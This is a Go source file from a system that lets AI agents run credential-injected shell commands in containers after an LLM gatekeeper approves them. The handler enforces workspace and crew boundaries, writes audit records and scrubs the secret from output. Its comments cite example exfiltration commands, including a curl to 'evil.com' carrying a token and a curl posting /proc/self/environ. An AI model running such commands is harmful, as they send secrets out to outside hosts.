package api

// HandleExecute — keeper command-execution handler. After the
// gatekeeper allows the request the credential is injected and the
// agent's shell command is run inside its container, with output
// scrubbed for the credential value before being returned. Extracted
// from keeper.go.

import (
	"context"
	"crypto/sha256"
	"database/sql"
	"encoding/base32"
	"encoding/base64"
	"encoding/hex"
	"errors"
	"io"
	"net/http"
	"net/url"
	"regexp"
	"strings"
	"sync"
	"time"

	"github.com/crewship-ai/crewship/internal/keeper"
	"github.com/crewship-ai/crewship/internal/keeper/gatekeeper"
	"github.com/crewship-ai/crewship/internal/provider"
	"github.com/crewship-ai/crewship/internal/scrubber"
)

// keeperExecuteClaimTTL bounds how long a dedup claim covers an in-flight
// /keeper/execute call: long enough to span gatekeeper evaluation (an LLM
// round-trip) plus the full container exec (executeTimeout), so a slow
// legitimate call can't have its claim expire out from under it while a
// concurrent duplicate is still waiting.
const keeperExecuteClaimTTL = executeTimeout + 10*time.Second

// keeperExecuteDebounceTTL is how long a claim is held AFTER the winning
// call finishes (success or failure), so a client retry-on-timeout that
// lands just after the original completes is still deduped instead of
// re-running the command a moment later.
const keeperExecuteDebounceTTL = 5 * time.Second

// keeperExecuteDedup is the single chokepoint (#1329) that gives POST
// /keeper/execute an idempotency key. HandleExecute calls claim() exactly
// once, before the PENDING audit insert and before any gatekeeper
// evaluation or container exec — every code path through the handler goes
// through this one call, so no branch (ALLOW, DENY, ESCALATE, or an error
// return) can bypass it. This is process-local (crewship is a single Go
// binary with no horizontal scaling of the API server within a workspace),
// so an in-memory map is sufficient — see internal/database for the
// process-wide-single-instance assumption this relies on.
type keeperExecuteDedup struct {
	mu       sync.Mutex
	inFlight map[string]time.Time // dedup key -> claim expiry
}

func newKeeperExecuteDedup() *keeperExecuteDedup {
	return &keeperExecuteDedup{inFlight: make(map[string]time.Time)}
}

// claim atomically reserves key until keeperExecuteClaimTTL from now.
// Returns false if another call already holds (or recently held, within
// its debounce window) the same key — the caller must not proceed.
func (d *keeperExecuteDedup) claim(key string) bool {
	d.mu.Lock()
	defer d.mu.Unlock()
	now := time.Now()
	if exp, ok := d.inFlight[key]; ok && now.Before(exp) {
		return false
	}
	// Opportunistic cleanup of fully-expired entries so the map doesn't
	// grow unbounded over the process lifetime.
	for k, exp := range d.inFlight {
		if now.After(exp) {
			delete(d.inFlight, k)
		}
	}
	d.inFlight[key] = now.Add(keeperExecuteClaimTTL)
	return true
}

// release shortens an active claim to the post-completion debounce window,
// called via defer once the winning call's outcome (ALLOW/DENY/ESCALATE or
// an error return) is decided.
func (d *keeperExecuteDedup) release(key string) {
	d.mu.Lock()
	defer d.mu.Unlock()
	d.inFlight[key] = time.Now().Add(keeperExecuteDebounceTTL)
}

// keeperExecuteDedupKey identifies "the same logical execute request" for
// dedup purposes: same workspace, same requesting agent, same resolved
// credential, same command. Hashed (not stored raw) so the in-memory key
// never holds a copy of the command string for longer than necessary.
func keeperExecuteDedupKey(workspaceID, agentID, credentialID, command string) string {
	sum := sha256.Sum256([]byte(workspaceID + "\x00" + agentID + "\x00" + credentialID + "\x00" + command))
	return hex.EncodeToString(sum[:])
}

// containerUserResolver is the narrow capability keeper needs from the
// container provider: report the container's configured run-as user (the
// Docker Config.User set at create time, e.g. "1001:1001"). It is an
// optional interface — a provider that doesn't implement it makes keeper
// fail closed rather than guess a uid. Kept separate from the broad
// provider.ContainerProvider interface so its many mocks don't all have to
// grow a method for this one call site (#1060).
type containerUserResolver interface {
	ContainerUser(ctx context.Context, containerID string) (string, error)
}

type keeperExecuteBody struct {
	RequestingAgentID string `json:"requesting_agent_id"`
	RequestingCrewID  string `json:"requesting_crew_id"`
	WorkspaceID       string `json:"workspace_id"`
	CredentialID      string `json:"credential_id"`
	CredentialName    string `json:"credential_name"`
	TaskID            string `json:"task_id,omitempty"`
	Intent            string `json:"intent"`
	Command           string `json:"command"`
	EnvVar            string `json:"env_var,omitempty"`
	ContainerID       string `json:"container_id"`
}

// containsDangerousShellChars, envVarNamePattern, interpreterPattern,
// scriptToolPattern — all moved to keeper_helpers.go (pure functions,
// no handler state).

// HandleExecute handles POST /api/v1/internal/keeper/execute.
// The sidecar forwards this request when an agent calls POST /keeper/execute.
// On ALLOW, the handler runs the command inside the agent's container with the
// credential injected as an env var, then returns scrubbed output.
// The credential value never reaches the agent — only the command output does.

func (h *KeeperHandler) HandleExecute(w http.ResponseWriter, r *http.Request) {
	var body keeperExecuteBody
	if err := readJSON(r, &body); err != nil {
		replyError(w, http.StatusBadRequest, "invalid JSON body")
		return
	}

	if body.RequestingAgentID == "" || body.RequestingCrewID == "" ||
		body.WorkspaceID == "" ||
		body.Intent == "" || body.Command == "" || body.ContainerID == "" {
		writeJSON(w, http.StatusBadRequest, map[string]string{
			"error": "requesting_agent_id, requesting_crew_id, workspace_id, intent, command, container_id required",
		})
		return
	}
	if body.CredentialID == "" && body.CredentialName == "" {
		writeJSON(w, http.StatusBadRequest, map[string]string{
			"error": "credential_id or credential_name required",
		})
		return
	}

	// Cross-tenant binding: same guard as HandleRequest, and more critical
	// here — an ALLOW on /execute injects the plaintext secret into
	// body.container_id and runs a command there. This route is internalAuth-only
	// with a body-carried workspace_id, so requireInternal's query-scope injection
	// does not constrain it. Reject before ANY credential lookup or container
	// exec: a workspace-A token must not name workspace-B's agent/crew/credential
	// to have B's secret injected into an attacker-chosen container.
	// assertBoundCrewWorkspaceDB additionally proves the named crew belongs to
	// that workspace. No-op for master-token callers (empty binding).
	if !assertInternalTokenWorkspace(w, r, body.WorkspaceID) {
		return
	}
	if !assertBoundCrewWorkspaceDB(w, r, h.db, h.logger, &body.RequestingCrewID) {
		return
	}

	// Resolve credential_name to credential_id if only name provided
	if body.CredentialID == "" && body.CredentialName != "" {
		err := h.db.QueryRowContext(r.Context(), `
			SELECT c.id FROM credentials c
			JOIN agent_credentials ac ON ac.credential_id = c.id
			WHERE ac.agent_id = ? AND ac.env_var_name = ? AND c.workspace_id = ?
			  AND c.status = 'ACTIVE' AND c.deleted_at IS NULL
			LIMIT 1`,
			body.RequestingAgentID, body.CredentialName, body.WorkspaceID).Scan(&body.CredentialID)
		if err != nil {
			writeJSON(w, http.StatusNotFound, map[string]string{
				"error": "credential not found for name: " + body.CredentialName,
			})
			return
		}
	}

	if len(body.Command) > maxExecuteCommandLength {
		writeJSON(w, http.StatusBadRequest, map[string]string{
			"error": "command exceeds maximum allowed length",
		})
		return
	}

	if strings.ContainsRune(body.Command, 0) {
		writeJSON(w, http.StatusBadRequest, map[string]string{
			"error": "command contains invalid characters",
		})
		return
	}

	// Reject commands with shell metacharacters that enable command chaining,
	// piping to external destinations, or output redirection. This prevents
	// exfiltration attacks like "gh pr list; curl evil.com -d $TOKEN".
	if containsDangerousShellChars(body.Command) {
		writeJSON(w, http.StatusBadRequest, map[string]string{
			"error": "command contains disallowed shell operators (;, &&, ||, |, $(, `, >, newline)",
		})
		return
	}

	// Validate env_var format if provided
	if body.EnvVar != "" && !envVarNamePattern.MatchString(body.EnvVar) {
		writeJSON(w, http.StatusBadRequest, map[string]string{
			"error": "env_var contains invalid characters",
		})
		return
	}

	// Validate agent exists, is not deleted, and belongs to claimed crew+workspace.
	// crewSlug is fetched for #1016: the exec target container is derived from
	// the agent's crew (id + slug), not the body-supplied container_id.
	var agentName, crewName, crewSlug, agentWorkspaceID string
	var agentCrewID sql.NullString
	err := h.db.QueryRowContext(r.Context(), `
		SELECT COALESCE(a.name,''), COALESCE(c.name,''), COALESCE(c.slug,''), a.workspace_id, a.crew_id
		FROM agents a
		LEFT JOIN crews c ON c.id = a.crew_id
		WHERE a.id = ? AND a.deleted_at IS NULL`, body.RequestingAgentID).Scan(
		&agentName, &crewName, &crewSlug, &agentWorkspaceID, &agentCrewID)
	if err != nil {
		if errors.Is(err, sql.ErrNoRows) {
			replyError(w, http.StatusUnauthorized, "requesting agent not found")
			return
		}
		h.logger.Error("keeper execute: lookup agent", "error", err)
		replyError(w, http.StatusInternalServerError, "internal error")
		return
	}
	if agentWorkspaceID != body.WorkspaceID {
		replyError(w, http.StatusForbidden, "workspace boundary violation")
		return
	}
	// Crew boundary (#1057): a crew-LESS agent (crew_id NULL) must not skip
	// the check and claim an arbitrary crew — same escape hatch closed on the
	// request path. Here it matters more: the claimed crew flows into the
	// derived exec-target container below.
	if agentCrewID.Valid {
		if agentCrewID.String != body.RequestingCrewID {
			replyError(w, http.StatusForbidden, "crew boundary violation")
			return
		}
	} else if body.RequestingCrewID != "" {
		replyError(w, http.StatusForbidden, "crew boundary violation")
		return
	}

	// Look up credential metadata. The JOIN on agent_credentials binds the
	// requesting agent so the credential_id-direct path requires an assignment,
	// matching the credential_name path — an agent cannot name a PEER agent's
	// credential_id in the same workspace. No assignment row → "credential not
	// found" (no existence leak).
	//
	// status = 'ACTIVE' gate: a credential the OAuth refresh worker or
	// UpdateCredentialStatus has marked EXPIRED / ERROR / REVOKED /
	// RATE_LIMITED is treated as unavailable here — the same not-found path —
	// so a stale/revoked secret is never injected even though the row is not
	// yet soft-deleted.
	// #1373: a credential grant may be a short-lived LEASE (agent_credentials
	// .expires_at). An expired lease is treated exactly like a missing
	// assignment here — the same not-found path — so a lapsed lease can never
	// be injected. NULL expires_at is a standing grant and always passes.
	// leaseNow is the fixed-width RFC3339 UTC comparison value; all lease
	// timestamps are written in the same form, so a TEXT comparison orders
	// correctly.
	leaseNow := time.Now().UTC().Format(time.RFC3339)

	var credName string
	var secLevel int
	err = h.db.QueryRowContext(r.Context(), `
		SELECT c.name, COALESCE(c.security_level, 1)
		FROM credentials c
		JOIN agent_credentials ac ON ac.credential_id = c.id
		WHERE c.id = ? AND ac.agent_id = ? AND c.workspace_id = ?
		  AND c.status = 'ACTIVE' AND c.deleted_at IS NULL
		  AND (ac.expires_at IS NULL OR ac.expires_at > ?)`,
		body.CredentialID, body.RequestingAgentID, body.WorkspaceID, leaseNow).Scan(&credName, &secLevel)
	if err != nil {
		if errors.Is(err, sql.ErrNoRows) {
			replyError(w, http.StatusNotFound, "credential not found")
			return
		}
		h.logger.Error("keeper execute: lookup credential", "error", err)
		replyError(w, http.StatusInternalServerError, "internal error")
		return
	}

	// Determine the environment variable name for the credential
	envVar := body.EnvVar
	if envVar == "" {
		// The assignment must exist: a missing agent_credentials row is a HARD
		// denial, not a silent fallback to a derived env-var name. (The metadata
		// JOIN above already requires the assignment, so a missing row here would
		// only arise from a concurrent unassignment — fail closed.)
		var assignedEnvVar string
		lookupErr := h.db.QueryRowContext(r.Context(),
			`SELECT env_var_name FROM agent_credentials WHERE agent_id = ? AND credential_id = ?`,
			body.RequestingAgentID, body.CredentialID).Scan(&assignedEnvVar)
		if lookupErr != nil {
			if errors.Is(lookupErr, sql.ErrNoRows) {
				replyError(w, http.StatusNotFound, "credential not found")
				return
			}
			h.logger.Error("keeper execute: lookup assignment env var", "error", lookupErr)
			replyError(w, http.StatusInternalServerError, "internal error")
			return
		}
		if assignedEnvVar != "" && envVarNamePattern.MatchString(assignedEnvVar) {
			envVar = assignedEnvVar
		} else {
			// Legitimate assignment exists but its env_var_name is empty/invalid:
			// derive a safe name from the credential name.
			envVar = envVarSanitizePattern.ReplaceAllString(strings.ToUpper(credName), "_")
			if envVar == "" || !envVarNamePattern.MatchString(envVar) {
				envVar = "KEEPER_SECRET"
			}
		}
	}

	// #1329: dedup chokepoint. Must run after credential resolution (so
	// body.CredentialID is the canonical resolved id, not a name) and
	// before ANY audit insert, gatekeeper evaluation, or container exec —
	// this is the one point every call passes through exactly once.
	dedupKey := keeperExecuteDedupKey(body.WorkspaceID, body.RequestingAgentID, body.CredentialID, body.Command)
	if !h.execDedup.claim(dedupKey) {
		h.logger.Warn("keeper execute: duplicate request suppressed",
			"agent", agentName, "credential", credName)
		dupNow := time.Now().UTC()
		if _, err := h.db.ExecContext(r.Context(), `
			INSERT INTO keeper_requests
			  (id, requesting_agent_id, requesting_crew_id, credential_id, task_id, intent,
			   request_type, command, decision, created_at, decided_at)
			VALUES (?, ?, ?, ?, NULLIF(?,?), ?, 'execute', ?, 'DUPLICATE_SUPPRESSED', ?, ?)`,
			generateCUID(), body.RequestingAgentID, body.RequestingCrewID, body.CredentialID,
			body.TaskID, "", body.Intent, body.Command,
			dupNow.Format(time.RFC3339), dupNow.Format(time.RFC3339)); err != nil {
			h.logger.Error("keeper execute: insert duplicate-suppressed audit record failed", "error", err)
		}
		writeJSON(w, http.StatusConflict, map[string]string{
			"error": "an identical keeper execute request is already in flight; retry after it completes",
		})
		return
	}
	defer h.execDedup.release(dedupKey)

	// Insert PENDING audit record
	reqID := generateCUID()
	req := keeper.Request{
		ID:                reqID,
		RequestingAgentID: body.RequestingAgentID,
		RequestingCrewID:  body.RequestingCrewID,
		CredentialID:      body.CredentialID,
		CredentialName:    credName,
		SecurityLevel:     keeper.SecurityLevel(secLevel),
		TaskID:            body.TaskID,
		Intent:            body.Intent,
		WorkspaceID:       body.WorkspaceID,
		CreatedAt:         time.Now().UTC(),
	}

	// #1021: FATAL. /execute is the highest-stakes keeper path — an ALLOW
	// injects the plaintext secret into a container and runs a command with
	// it. Proceeding with a swallowed audit INSERT would let that happen with
	// NO record; an attacker inducing DB write pressure could suppress the
	// trail while still getting the secret + exec. Fail closed before any
	// evaluation or injection.
	if _, err := h.db.ExecContext(r.Context(), `
		INSERT INTO keeper_requests
		  (id, requesting_agent_id, requesting_crew_id, credential_id, task_id, intent,
		   request_type, command, decision, created_at)
		VALUES (?, ?, ?, ?, NULLIF(?,?), ?, 'execute', ?, 'PENDING', ?)`,
		reqID, body.RequestingAgentID, body.RequestingCrewID, body.CredentialID,
		body.TaskID, "", body.Intent, body.Command, req.CreatedAt.Format(time.RFC3339)); err != nil {
		h.logger.Error("keeper execute: insert PENDING audit record failed; refusing to decide without an audit row", "error", err)
		replyError(w, http.StatusInternalServerError, "audit persistence failed")
		return
	}

	// Load agent's recent conversation history for Keeper context
	execConvHistory := h.loadConversationHistory(r.Context(), body.RequestingAgentID)

	// Gatekeeper evaluation (include the command so the LLM can reason about it)
	evalReq := gatekeeper.EvalRequest{
		Request:        req,
		CredentialName: credName,
		SecurityLevel:  keeper.SecurityLevel(secLevel),
		AgentName:      agentName,
		CrewName:       crewName,
		Command:        body.Command,
		ConvHistory:    execConvHistory,
	}

	var gkResp keeper.GatekeeperResponse
	if h.gatekeeper != nil {
		var evalErr error
		gkResp, evalErr = h.gatekeeper.Evaluate(r.Context(), evalReq)
		if evalErr != nil {
			h.logger.Error("keeper execute: gatekeeper evaluate failed", "error", evalErr)
			gkResp = keeper.GatekeeperResponse{
				Decision:  string(keeper.DecisionDeny),
				Reason:    "Keeper evaluation failed — deny by default",
				RiskScore: 10,
			}
		}
	} else {
		gkResp = keeper.GatekeeperResponse{
			Decision:  string(keeper.DecisionDeny),
			Reason:    "Keeper not configured",
			RiskScore: 10,
		}
	}

	// Clamp risk score to valid range [1, 10]
	if gkResp.RiskScore < 1 {
		gkResp.RiskScore = 1
	}
	if gkResp.RiskScore > 10 {
		gkResp.RiskScore = 10
	}

	now := time.Now().UTC().Format(time.RFC3339)

	if gkResp.Decision != string(keeper.DecisionAllow) {
		// DENY or ESCALATE: update audit and return without executing
		if _, err := h.db.ExecContext(r.Context(), `
			UPDATE keeper_requests SET decision=?, reason=?, risk_score=?, decided_at=?, ollama_prompt=?, ollama_raw_response=? WHERE id=?`,
			gkResp.Decision, gkResp.Reason, gkResp.RiskScore, now,
			nullIfEmpty(gkResp.Prompt), nullIfEmpty(gkResp.RawLLMResponse), reqID); err != nil {
			h.logger.Error("keeper execute: update audit (deny)", "error", err)
		}
		h.logger.Info("keeper execute: denied",
			"request_id", reqID, "agent", agentName, "credential", credName, "decision", gkResp.Decision)
		if h.broadcaster != nil {
			h.broadcaster.BroadcastKeeperEvent(body.WorkspaceID, map[string]any{
				"request_id":      reqID,
				"request_type":    "execute",
				"agent_name":      agentName,
				"credential_name": credName,
				"intent":          body.Intent,
				"command":         body.Command,
				"decision":        gkResp.Decision,
				"reason":          gkResp.Reason,
				"risk_score":      gkResp.RiskScore,
				"decided_at":      now,
			})
		}
		writeJSON(w, http.StatusOK, keeper.ExecuteResult{
			RequestID: reqID,
			Decision:  keeper.Decision(gkResp.Decision),
			Reason:    gkResp.Reason,
			RiskScore: gkResp.RiskScore,
		})
		return
	}

	// ALLOW: retrieve secret and execute command in the agent's container
	if h.secrets == nil || h.container == nil {
		h.logger.Error("keeper execute: secrets store or container provider not configured")
		writeJSON(w, http.StatusInternalServerError, map[string]string{
			"error": "keeper execute not fully configured",
		})
		return
	}

	// Re-validate the credential is STILL active AND still assigned to this
	// agent before injecting. The gatekeeper Evaluate above can take seconds
	// (LLM round-trip), during which the OAuth refresh worker or an operator
	// may revoke/expire the credential, or the agent_credentials assignment
	// may be removed. The metadata lookup's status + assignment filter is
	// then stale, so re-run the SAME JOIN here (not a credentials-only check)
	// and fail closed — a just-revoked or just-unassigned secret is never
	// handed to the container.
	var stillActive int
	if err := h.db.QueryRowContext(r.Context(),
		`SELECT 1 FROM credentials c
		 JOIN agent_credentials ac ON ac.credential_id = c.id
		 WHERE c.id = ? AND ac.agent_id = ? AND c.workspace_id = ?
		   AND c.status = 'ACTIVE' AND c.deleted_at IS NULL
		   AND (ac.expires_at IS NULL OR ac.expires_at > ?)`,
		body.CredentialID, body.RequestingAgentID, body.WorkspaceID,
		time.Now().UTC().Format(time.RFC3339)).Scan(&stillActive); err != nil {
		h.logger.Warn("keeper execute: credential no longer active at inject time",
			"credential_id", body.CredentialID, "error", err)
		writeJSON(w, http.StatusNotFound, map[string]string{"error": "credential not found"})
		return
	}

	plainValue, found := h.secrets.Get(body.CredentialID)
	if !found {
		h.logger.Error("keeper execute: secret not in store", "credential_id", body.CredentialID)
		writeJSON(w, http.StatusInternalServerError, map[string]string{
			"error": "credential not available in secrets store",
		})
		return
	}

	// #1016: pin the exec target to the requesting agent's OWN crew container,
	// derived server-side from its crew (CrewContainerName is the exact
	// instance-prefixed name used to CREATE the container, so the provider Exec
	// resolves it to the same container the agent's sidecar runs in). The
	// body-supplied container_id (the sidecar's runtime id) is NOT trusted:
	// within a single workspace an intra-tenant peer could otherwise name
	// another agent's container and have this agent's plaintext secret injected
	// and a command run there. #1015 closed the cross-tenant case; this closes
	// the intra-workspace peer case.
	if !agentCrewID.Valid {
		// Unreachable in practice (requesting_crew_id is required and the crew
		// boundary check above rejects a crew-less agent claiming a crew), but
		// guard so we never fall back to a body-chosen container target.
		replyError(w, http.StatusForbidden, "requesting agent has no crew container")
		return
	}
	execContainer := h.container.CrewContainerName(agentCrewID.String, crewSlug)
	if body.ContainerID != "" && body.ContainerID != execContainer {
		h.logger.Warn("keeper execute: ignoring request-supplied container_id (using derived crew container)",
			"agent_id", body.RequestingAgentID, "supplied", body.ContainerID, "derived", execContainer)
	}

	execCtx, cancel := context.WithTimeout(r.Context(), executeTimeout)
	defer cancel()

	// #1060: run the credential-injected command as the SAME user the agent
	// process actually runs as, resolved from the live container — not a
	// hardcoded "1001:1001". A drift between the create-time user (a custom
	// base image, a future uid bump, userns-remap) and this constant would
	// silently break the "run as the agent" containment and could run the
	// command with a different privilege set. Resolve it, and fail closed if
	// the user is undeterminable or privileged rather than defaulting.
	resolver, ok := h.container.(containerUserResolver)
	if !ok {
		h.logger.Error("keeper execute: container provider cannot resolve run-as user; failing closed",
			"container", execContainer)
		writeJSON(w, http.StatusInternalServerError, map[string]string{"error": "keeper execute not available"})
		return
	}
	execUser, userErr := resolver.ContainerUser(execCtx, execContainer)
	if userErr != nil || execUser == "" || provider.IsPrivilegedExecUser(execUser) {
		h.logger.Error("keeper execute: could not resolve an unprivileged container user; failing closed",
			"container", execContainer, "resolved_user", execUser, "error", userErr)
		writeJSON(w, http.StatusInternalServerError, map[string]string{"error": "keeper execute not available"})
		return
	}

	execResult, execErr := h.container.Exec(execCtx, provider.ExecConfig{
		ContainerID: execContainer,
		Cmd:         []string{"sh", "-c", body.Command},
		Env:         []string{envVar + "=" + plainValue},
		User:        execUser,
	})

	var rawOutput []byte
	exitCode := -1

	if execErr != nil {
		h.logger.Error("keeper execute: exec failed", "error", execErr, "container_id", execContainer)
		// Return generic error message — never expose Docker internals to the agent
		rawOutput = []byte("command execution failed")
	} else {
		// Read output up to the configured limit
		rawOutput, _ = io.ReadAll(io.LimitReader(execResult.Reader, maxExecuteOutputBytes))
		execResult.Reader.Close()

		// Get the process exit code
		_, exitCode, _ = h.container.ExecInspect(execCtx, execResult.ExecID)
	}

	// Scrub the credential value from any output it may have leaked into.
	// Add encoding variants to catch exfil attempts like "echo $TOKEN | base64"
	// that would bypass literal-only scrubbing. DEFENSE-IN-DEPTH, not a boundary
	// (#1022/#1064): a per-secret encoding set can never enumerate every
	// transform (gzip, split/chunk, XOR, custom alphabet, or a tool like
	// `curl --data-binary @/proc/self/environ` that never prints the secret at
	// all). The real containment for single-tool self-exfil is the sandbox +
	// egress policy — EPIC #1001 M2b (private bridge + egress enforcement). This
	// only raises the cost of the common one-liners; do not rely on it.
	//
	// Kept inline (rather than scrubber.AddSecretValues, which registers the
	// same set) only to preserve the [REDACTED:keeper-secret] marker that
	// keeper_execute_test.go pins; the encoding list is kept in sync with it.
	s := scrubber.New()
	if plainValue != "" {
		enc := func(v string) {
			if v != "" {
				_ = s.AddPattern("keeper-secret", regexp.QuoteMeta(v))
			}
		}
		enc(plainValue)
		enc(base64.StdEncoding.EncodeToString([]byte(plainValue)))
		enc(base64.URLEncoding.EncodeToString([]byte(plainValue)))
		enc(base64.RawStdEncoding.EncodeToString([]byte(plainValue))) // unpadded base64 (JWT-style / raw emitters)
		enc(base64.RawURLEncoding.EncodeToString([]byte(plainValue)))
		enc(base32.StdEncoding.EncodeToString([]byte(plainValue))) // base32
		enc(url.QueryEscape(plainValue))
		hexEnc := hex.EncodeToString([]byte(plainValue))
		enc(hexEnc)                    // lower-case hex (xxd -p)
		enc(strings.ToUpper(hexEnc))   // upper-case hex (od -A n -t x1 | tr)
		enc(reverseString(plainValue)) // rev
	}
	scrubbedOutput := s.Scrub(string(rawOutput))

	// Update the audit record with the final decision and exit code
	if _, err := h.db.ExecContext(r.Context(), `
		UPDATE keeper_requests SET decision=?, reason=?, risk_score=?, exit_code=?, decided_at=?, ollama_prompt=?, ollama_raw_response=? WHERE id=?`,
		string(keeper.DecisionAllow), gkResp.Reason, gkResp.RiskScore, exitCode, now,
		nullIfEmpty(gkResp.Prompt), nullIfEmpty(gkResp.RawLLMResponse), reqID); err != nil {
		h.logger.Error("keeper execute: update audit (allow)", "error", err)
	}

	h.logger.Info("keeper execute: completed",
		"request_id", reqID, "agent", agentName, "credential", credName,
		"exit_code", exitCode, "output_bytes", len(scrubbedOutput))

	if h.broadcaster != nil {
		h.broadcaster.BroadcastKeeperEvent(body.WorkspaceID, map[string]any{
			"request_id":      reqID,
			"request_type":    "execute",
			"agent_name":      agentName,
			"credential_name": credName,
			"intent":          body.Intent,
			"command":         body.Command,
			"decision":        string(keeper.DecisionAllow),
			"reason":          gkResp.Reason,
			"risk_score":      gkResp.RiskScore,
			"exit_code":       exitCode,
			"decided_at":      now,
		})
	}

	writeJSON(w, http.StatusOK, keeper.ExecuteResult{
		RequestID: reqID,
		Decision:  keeper.DecisionAllow,
		Reason:    gkResp.Reason,
		RiskScore: gkResp.RiskScore,
		Output:    scrubbedOutput,
		ExitCode:  exitCode,
	})
}

// GetRequest handles GET /api/v1/internal/keeper/request/{requestId}.
// Returns the status and decision of a previously submitted keeper request.
